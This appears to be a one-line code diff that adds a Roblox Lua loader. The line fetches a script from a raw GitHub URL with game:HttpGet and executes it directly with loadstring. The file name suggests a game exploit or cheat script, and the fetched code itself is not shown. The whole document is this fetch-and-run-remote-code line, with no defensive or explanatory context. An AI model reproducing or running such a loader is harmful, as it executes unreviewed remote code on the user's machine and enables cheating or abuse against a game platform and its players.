@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LeopardEquip39/loaders/main/loaders/fake-an-egg-spam3-t34ua6vhmc4ryp.lua"))()
